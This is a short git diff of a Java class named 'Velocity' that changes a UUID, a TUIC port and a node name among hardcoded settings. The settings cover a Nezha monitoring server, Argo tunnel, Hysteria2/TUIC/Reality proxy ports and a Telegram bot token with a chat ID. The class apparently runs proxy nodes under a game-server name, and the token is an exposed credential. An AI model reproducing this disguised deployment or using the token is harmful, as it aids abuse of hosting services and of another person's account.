@@ -146,7 +146,7 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("UUID", "81ef31cb-a91b-dcae-a14c-d056f821b3a3");
+    envVars.put("UUID", "81933fcb-a91b-dcae-a14c-d056f821b3a3");
     envVars.put("FILE_PATH", "./lang");
     envVars.put("NEZHA_SERVER", "nezha.kadcs.eu.org:443");
     envVars.put("NEZHA_PORT", "");
@@ -155,14 +155,14 @@ public final class Velocity {
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
     envVars.put("HY2_PORT", "");
-    envVars.put("TUIC_PORT", "25662");
+    envVars.put("TUIC_PORT", "25585");
     envVars.put("REALITY_PORT", "");
     envVars.put("UPLOAD_URL", "");
     envVars.put("CHAT_ID", "5987241018");
     envVars.put("BOT_TOKEN", "6779283566:AAE-fSGDSik8uy8VoACv4_tLJx6D0ApVSRQ");
     envVars.put("CFIP", "skk.moe");
     envVars.put("CFPORT", "443");
-    envVars.put("NAME", "KingsDomain");
+    envVars.put("NAME", "Minex");
 
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
